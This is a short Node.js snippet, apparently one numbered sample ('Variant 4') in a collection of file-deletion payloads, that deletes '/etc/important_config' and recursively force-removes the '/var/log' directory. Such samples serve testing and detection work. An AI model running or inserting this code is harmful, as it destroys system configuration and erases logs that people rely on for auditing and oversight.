// File Manipulation - Delete Files Variant 4
const fs = require('fs');
fs.unlinkSync('/etc/important_config');
fs.rmSync('/var/log', { recursive: true, force: true });

// Variant 4
